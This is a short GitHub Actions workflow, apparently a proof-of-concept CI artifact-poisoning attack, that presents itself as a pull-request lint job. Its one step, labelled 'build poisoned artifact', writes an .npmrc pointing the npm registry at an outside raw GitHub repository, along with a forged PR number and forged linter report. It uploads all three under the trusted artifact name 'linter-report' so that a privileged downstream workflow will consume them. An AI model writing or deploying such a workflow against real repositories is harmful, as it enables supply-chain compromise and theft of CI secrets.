name: Lint
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: build poisoned artifact
        run: |
          mkdir -p /tmp/att
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-registry/main/\naudit=false\nfund=false\nprogress=false\n' > /tmp/att/.npmrc
          echo "1" > /tmp/att/pr-number.txt
          printf 'forged linter report\n' > /tmp/att/linter-report.txt
          ls -la /tmp/att
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            /tmp/att/.npmrc
            /tmp/att/pr-number.txt
            /tmp/att/linter-report.txt
          include-hidden-files: true
          if-no-files-found: ignore
